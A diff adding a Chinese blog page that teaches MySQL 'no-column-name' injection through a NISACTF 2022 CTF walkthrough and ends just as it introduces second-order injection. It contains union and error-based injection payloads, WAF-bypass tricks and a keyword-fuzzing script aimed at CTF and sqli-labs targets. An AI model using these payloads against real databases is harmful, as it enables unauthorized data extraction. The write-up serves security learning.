@@ -1,0 +1,425 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>无列名注入&amp;二次注入 | lu1ux's blog</title><meta name="author" content="lu1ux"><meta name="copyright" content="lu1ux"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="无列名注入什么是无列名注入？ 顾名思义，就是在不知道列名的情况下进行 sql 注入。 在 mysql &#x3D;&gt; 5 的版本中存在一个名为 information_schema的库，里面记录着 mysql 中所有表的结构。通常，在 mysql sqli 中，我们会通过此库中的表去获取其他表的结构，也就是表名、列名等。但是这个库经常被 WAF 过滤。 使用条件&amp;方法 无列名注入主要">
+<meta property="og:type" content="article">
+<meta property="og:title" content="无列名注入&amp;二次注入">
+<meta property="og:url" content="http://example.com/2025/11/25/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="lu1ux&#39;s blog">
+<meta property="og:description" content="无列名注入什么是无列名注入？ 顾名思义，就是在不知道列名的情况下进行 sql 注入。 在 mysql &#x3D;&gt; 5 的版本中存在一个名为 information_schema的库，里面记录着 mysql 中所有表的结构。通常，在 mysql sqli 中，我们会通过此库中的表去获取其他表的结构，也就是表名、列名等。但是这个库经常被 WAF 过滤。 使用条件&amp;方法 无列名注入主要">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/21.jpg">
+<meta property="article:published_time" content="2025-11-25T13:29:26.000Z">
+<meta property="article:modified_time" content="2025-11-25T13:33:15.420Z">
+<meta property="article:author" content="lu1ux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/21.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/11/25/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '无列名注入&二次注入',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-11-25 21:33:15'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="//at.alicdn.com/t/c/font_4066449_d5kq6u6u9dj.css"><link rel="stylesheet" href="/css/mine.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (false) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avator.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">14</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-zhuye"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-archive-solid"></i><span> 归档</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/21.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="lu1ux's blog"><span class="site-name">lu1ux's blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-zhuye"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-archive-solid"></i><span> 归档</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">无列名注入&amp;二次注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-11-25T13:29:26.000Z" title="Created 2025-11-25 21:29:26">2025-11-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-11-25T13:33:15.420Z" title="Updated 2025-11-25 21:33:15">2025-11-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="无列名注入&amp;二次注入"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h1><p><strong>什么是无列名注入？</strong></p>
+<p>顾名思义，就是在不知道列名的情况下进行 sql 注入。</p>
+<p>在 mysql &#x3D;&gt; 5 的版本中存在一个名为 <code>information_schema</code>的库，里面记录着 mysql 中所有表的结构。通常，在 mysql sqli 中，我们会通过此库中的表去获取其他表的结构，也就是表名、列名等。但是这个库经常被 WAF 过滤。</p>
+<p><strong>使用条件&amp;方法</strong></p>
+<p>无列名注入主要是适用于已经获取到数据表，但无法查询列的情况下，在大多数 CTF 题目中，<code>information_schema</code> 库被过滤，使用这种方法获取列名。</p>
+<p>无列名注入的原理其实很简单，类似于将我们不知道的列名进行取别名操作，在取别名的同时进行数据查询，所以，如果我们查询的字段多于数据表中列的时候，就会出现报错。</p>
+<h3 id="bypass-information-schema"><a href="#bypass-information-schema" class="headerlink" title="bypass information_schema"></a>bypass information_schema</h3><ol>
+<li>information_schema这个数据库存放着其他数据库的信息,包括表名,字段名等.在常规注入过程中利用information_schema就是想要获取到其中的信息.</li>
+<li>mysql在5.7版本中新增了sys.schema:<ol>
+<li><code>sys.schema_auto_increment_columns #该视图的作用是对表自增ID进行监控</code>就是说,某张表如果存在自增ID,我们就可以通过该视图获取数据库中的该表名信息.</li>
+<li>如果该表没有自增主键呢?-&gt;<code>sys.schema_table_statistics_with_buffer</code></li>
+<li>payload(环境:sqli-labs Less1):<ol>
+<li><code>?id=-1&#39; union select 1,(select group_concat(table_name) from sys.schema_auto_increment_columns where table_schema=database()),3 --+</code></li>
+<li><code>?id=-1&#39; union select 1,(select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),3 --+</code></li>
+</ol>
+</li>
+<li>限制条件:<ol>
+<li>mysql version&gt;&#x3D;5.7</li>
+<li>要求权限高,一般root用户才可以访问</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<h3 id="join"><a href="#join" class="headerlink" title="join"></a>join</h3><p>利用JOIN去进行无列名注入，通过JOIN建立两个表之间的内连接，也就是说将两张表的列名给加起来，可能会爆出相同的列名的名字，我们利用的就是这个特性来爆出列名</p>
+<p>简单分析一下AS的作用是取别名，把admin表当做a，join起连接作用，下面看看执行效果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select * from admin as a join admin as b)as c;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213308766.png" alt="image-20250319180819181"></p>
+<p>爆出第一列列名为id</p>
+<p>之后我们使用using来声明内连接，比如我要查第二列的数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select * from admin as a join admin b using(id))c;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213308786.png" alt="image-20250319181101928"></p>
+<p>爆出第二列的列名为name</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select * from admin as a join admin b using(id))c;</span><br></pre></td></tr></table></figure>
+
+<p>以此类推,爆出第三列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select * from admin as a join admin b using(id,name))c;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213308728.png" alt="image-20250319181216340"></p>
+<h3 id="不使用表名查询"><a href="#不使用表名查询" class="headerlink" title="不使用表名查询"></a>不使用表名查询</h3><p>正常的查询如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from `admin`;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213308762.png" alt="image-20250319172659256"></p>
+<p>其中，列名为 id、name、password，使用 union 查询：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 union select * from admin;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213308775.png" alt="image-20250319172833200"></p>
+<p>如图，我们的列名被替换为了对应的数字。也就是说，我们可以继续数字来对应列，如 3 对应了表里面的 password：</p>
+<p>这里有两点需要注意一下:</p>
+<ol>
+<li>列名需要用&#96;&#96;包裹起来</li>
+<li>使用子查询的时候,即一个查询嵌套在另一个查询中,内层查询的结果可以作为外层查询的条件,内层查询到的结果需要起一个别名(as)</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select `3` from (select 1,2,3 union select * from admin)a;</span><br></pre></td></tr></table></figure>
+
+<p>末尾的 a 可以是任意字符，用于命名</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213308734.png" alt="image-20250319173149358"></p>
+<p>当然，多数情况下， `会被过滤。当 ` 不能使用的时候，使用别名来代替：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2,3 as b union select * from admin)a;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213309346.png" alt="image-20250319173443805"></p>
+<p>同时查询多个列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(`2`,0x2d,`3`) from (select 1,2,3 union select * from admin)a limit 1,3;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213309415.png" alt="image-20250319173747410"></p>
+<p>简而言之，可以通过任意命名进入该表，然后使用 SELECT 查询这些字段中的任何已知值。</p>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="NISACTF-2022-join-us"><a href="#NISACTF-2022-join-us" class="headerlink" title="[NISACTF 2022]join-us"></a>[NISACTF 2022]join-us</h4><p>报错注入&amp;无列名注入</p>
+<p>进入题目点击登录,发现一个SQL注入点</p>
+<p>这道题的名字叫join,推测是无列名注入</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213309639.png" alt="image-20250319144643916"></p>
+<p>判断是双引号闭合</p>
+<p>用BP抓包发现是post提交的变量tt</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213309513.png" alt="image-20250319144912656"></p>
+<p>尝试用group by判断列数,发现被waf拦截了</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213309663.png" alt="image-20250319145032880"></p>
+<p>于是搞一个脚本fuzzing一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">fuzz=&#123;&#x27;length &#x27;,&#x27;+&#x27;,&#x27;handler&#x27;,&#x27;like&#x27;,&#x27;select&#x27;,&#x27;sleep&#x27;,&#x27;database&#x27;,&#x27;delete&#x27;,&#x27;having&#x27;,&#x27;or&#x27;,&#x27;as&#x27;,&#x27;-~&#x27;,&#x27;BENCHMARK&#x27;,&#x27;limit&#x27;,&#x27;left&#x27;,&#x27;select&#x27;,&#x27;insert&#x27;</span><br><span class="line">,&#x27;sys.schema_auto_increment_columns&#x27;,&#x27;join&#x27;,&#x27;right&#x27;,&#x27;#&#x27;,&#x27;&amp;&#x27;,&#x27;&amp;&amp;&#x27;,&#x27;\\&#x27;,&#x27;handler&#x27;,&#x27;---&#x27;,&#x27;--&#x27;,&#x27;--+&#x27;,&#x27;INFORMATION&#x27;,&#x27;--&#x27;,&#x27;;&#x27;,&#x27;!&#x27;,&#x27;%&#x27;,&#x27;+&#x27;,&#x27;xor&#x27;,&#x27;&lt;&gt;&#x27;</span><br><span class="line">,&#x27;(&#x27;,&#x27;&gt;&#x27;,&#x27;&lt;&#x27;,&#x27;)&#x27;,&#x27;.&#x27;,&#x27;^&#x27;,&#x27;=&#x27;,&#x27;AND&#x27;,&#x27;BY&#x27;,&#x27;CAST&#x27;,&#x27;COLUMN&#x27;,&#x27;COUNT&#x27;,&#x27;CREATE&#x27;,&#x27;END&#x27;,&#x27;case&#x27;,&quot;&#x27;1&#x27;=&#x27;1&#x27;&quot;,&#x27;when&#x27;,&quot;admin&#x27;&quot;,&#x27;length&#x27;,&#x27;+&#x27;,&#x27;REVERSE&#x27;,&#x27;ascii&#x27;</span><br><span class="line">,&#x27;select&#x27;,&#x27;database&#x27;,&#x27;left&#x27;,&#x27;right&#x27;,&#x27;union&#x27;,&#x27;||&#x27;,&#x27;oorr&#x27;,&#x27;/&#x27;,&#x27;//&#x27;,&#x27;//*&#x27;,&#x27;*/*&#x27;,&#x27;/**/&#x27;,&#x27;anandd&#x27;,&#x27;GROUP&#x27;,&#x27;HAVING&#x27;,&#x27;IF&#x27;,&#x27;INTO&#x27;,&#x27;JOIN&#x27;,&#x27;LEAVE&#x27;,&#x27;LEFT&#x27;</span><br><span class="line">,&#x27;LEVEL&#x27;,&#x27;sleep&#x27;,&#x27;LIKE&#x27;,&#x27;NAMES&#x27;,&#x27;NEXT&#x27;,&#x27;NULL&#x27;,&#x27;OF&#x27;,&#x27;ON&#x27;,&#x27;|&#x27;,&#x27;information_schema&#x27;,&#x27;user&#x27;,&#x27;OR&#x27;,&#x27;ORDER&#x27;,&#x27;ORD&#x27;,&#x27;SCHEMA&#x27;,&#x27;SELECT&#x27;,&#x27;SET&#x27;,&#x27;TABLE&#x27;,&#x27;THEN&#x27;</span><br><span class="line">,&#x27;UPDATE&#x27;,&#x27;USER&#x27;,&#x27;USING&#x27;,&#x27;VALUE&#x27;,&#x27;VALUES&#x27;,&#x27;WHEN&#x27;,&#x27;WHERE&#x27;,&#x27;ADD&#x27;,&#x27;AND&#x27;,&#x27;prepare&#x27;,&#x27;set&#x27;,&#x27;update&#x27;,&#x27;delete&#x27;,&#x27;drop&#x27;,&#x27;inset&#x27;,&#x27;CAST&#x27;,&#x27;COLUMN&#x27;,&#x27;CONCAT&#x27;</span><br><span class="line">,&#x27;GROUP_CONCAT&#x27;,&#x27;group_concat&#x27;,&#x27;CREATE&#x27;,&#x27;DATABASE&#x27;,&#x27;DATABASES&#x27;,&#x27;alter&#x27;,&#x27;DELETE&#x27;,&#x27;DROP&#x27;,&#x27;floor&#x27;,&#x27;rand()&#x27;,&#x27;information_schema.tables&#x27;,&#x27;TABLE_SCHEMA&#x27;</span><br><span class="line">,&#x27;%df&#x27;,&#x27;concat_ws()&#x27;,&#x27;concat&#x27;,&#x27;LIMIT&#x27;,&#x27;ORD&#x27;,&#x27;ON&#x27;</span><br><span class="line">,&#x27;extractvalue&#x27;,&#x27;order&#x27;,&#x27;CAST()&#x27;,&#x27;by&#x27;,&#x27;ORDER&#x27;,&#x27;OUTFILE&#x27;,&#x27;RENAME&#x27;,&#x27;REPLACE&#x27;,&#x27;SCHEMA&#x27;,&#x27;SELECT&#x27;,&#x27;SET&#x27;,&#x27;updatexml&#x27;,&#x27;SHOW&#x27;,&#x27;SQL&#x27;,&#x27;TABLE&#x27;,&#x27;THEN&#x27;,&#x27;TRUE&#x27;,&#x27;instr&#x27;</span><br><span class="line">,&#x27;benchmark&#x27;,&#x27;format&#x27;,&#x27;bin&#x27;,&#x27;substring&#x27;,&#x27;ord&#x27;,&#x27;UPDATE&#x27;,&#x27;VALUES&#x27;,&#x27;VARCHAR&#x27;,&#x27;VERSION&#x27;,&#x27;WHEN&#x27;,&#x27;WHERE&#x27;,&#x27;/*&#x27;,&#x27;`&#x27;,&#x27;,&#x27;,&#x27;users&#x27;,&#x27;%0a&#x27;,&#x27;%0b&#x27;,&#x27;mid&#x27;,&#x27;for&#x27;,&#x27;BEFORE&#x27;,&#x27;REGEXP&#x27;</span><br><span class="line">,&#x27;RLIKE&#x27;,&#x27;in&#x27;,&#x27;sys schemma&#x27;,&#x27;SEPARATOR&#x27;,&#x27;XOR&#x27;,&#x27;CURSOR&#x27;,&#x27;FLOOR&#x27;,&#x27;sys.schema_table_statistics_with_buffer&#x27;,&#x27;INFILE&#x27;,&#x27;count&#x27;,&#x27;%0c&#x27;,&#x27;from&#x27;,&#x27;%0d&#x27;,&#x27;%a0&#x27;,&#x27;=&#x27;,&#x27;@&#x27;,&#x27;else&#x27;,&#x27;information_schema.columns&#x27;&#125;</span><br><span class="line">for i in fuzz:</span><br><span class="line">    res = requests.post(url=&#x27;http://node5.anna.nssctf.cn:24052/dl.php&#x27;,data=&#123;&#x27;tt&#x27;:i&#125;)</span><br><span class="line">    if &#x27;不要耍小心思喔~&#x27;  in res.text:</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure>
+
+<p>这段代码的主要作用是利用<strong>Fuzzing (模糊测试)技术</strong>对目标站点进行 SQL 注入检测，核心逻辑是：</p>
+<ol>
+<li>定义 SQL 相关的敏感关键字。</li>
+<li>遍历关键字并发送 <code>POST</code> 请求到 <code>http://1.14.71.254:28911/dl.php</code>。</li>
+<li>通过服务器返回的内容（是否包含 <code>&quot;不要耍小心思喔~&quot;</code>）来判断关键字是否被拦截。</li>
+</ol>
+<p>运行脚本,得到了过滤的关键字</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213309592.png" alt="image-20250319161404412"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">substring</span><br><span class="line">BY</span><br><span class="line">CAST()</span><br><span class="line">update</span><br><span class="line">DATABASE</span><br><span class="line">database</span><br><span class="line">rand()</span><br><span class="line">as</span><br><span class="line">=</span><br><span class="line">benchmark</span><br><span class="line">updatexml</span><br><span class="line">anandd</span><br><span class="line">FLOOR</span><br><span class="line">AND</span><br><span class="line">case</span><br><span class="line">COLUMN</span><br><span class="line">DATABASES</span><br><span class="line">BENCHMARK</span><br><span class="line">&amp;</span><br><span class="line">handler</span><br><span class="line">floor</span><br><span class="line">left</span><br><span class="line">CAST</span><br><span class="line">LEFT</span><br><span class="line">by</span><br><span class="line">sleep</span><br><span class="line">IF</span><br><span class="line">UPDATE</span><br><span class="line">&amp;&amp;</span><br><span class="line">&#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line">right</span><br><span class="line">union</span><br><span class="line">information_schema.columns</span><br><span class="line">insert</span><br><span class="line">sys.schema_auto_increment_columns</span><br><span class="line">ascii</span><br></pre></td></tr></table></figure>
+
+<p>禁用了ascii函数，禁用了updatexml函数，但是可以使用extractvalue函数。</p>
+<p>database被禁，所以可以考虑用访问一个不存在的数据库来返回数据库。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or (select * from aa)#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213309992.png" alt="image-20250319162219103"></p>
+<p>爆出库名为sqlsql</p>
+<p>然后就是正常的报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema like &#x27;sqlsql&#x27;)))#</span><br></pre></td></tr></table></figure>
+
+<p>发现竟然被拦截了</p>
+<p>试了好几次发现是or被拦截了,可是上面明明也用了,为什么呢?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; || extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema like &#x27;sqlsql&#x27;)))#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213310092.png" alt="image-20250319163129025"></p>
+<p>爆出表名是<code>Fal_flag,output</code></p>
+<p>利用join爆表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;||extractvalue(1,concat(0x7e,(select*from(select * from output a join output b)c),1))#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213310381.png" alt="image-20250319183512976"></p>
+<p><code>information_schema.columns</code>被禁,所以采用无列名注入</p>
+<p>一般在报错注入里面我们是用<code>left</code>和<code>right</code>，在这里left被ban了就引用到了另一个<code>mid</code>函数：</p>
+<p>实际上，<code>MID()</code> <strong>完全等价</strong> 于 <code>SUBSTRING()</code>：</p>
+<p>MySQL 内部执行时，<code>MID()</code> 只是 <code>SUBSTRING()</code> 的别名。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; || extractvalue(1,mid(concat(0x7e,(select data from output)),1,30))#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213310449.png" alt="image-20250319165036385"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; || extractvalue(1,mid(concat(0x7e,(select data from output)),29,40))#</span><br></pre></td></tr></table></figure>
+
+<p>两段拼接得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;377ae33c-57e4-4bea-91fe-43a5ef2439a4&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p> 二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213310545.png" alt="image-20250321203901150"></p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在后端代码中可能会被转义，但在存入数据库时还是原来的数据，数据中一般带有单引号和＃号，然后下次使用在拼凑SQL中，所以就形成了二次注入。</p>
+<h4 id="注入条件"><a href="#注入条件" class="headerlink" title="注入条件"></a>注入条件</h4><p>两次注入分别是<strong>插入恶意数据</strong>、<strong>利用恶意数据</strong></p>
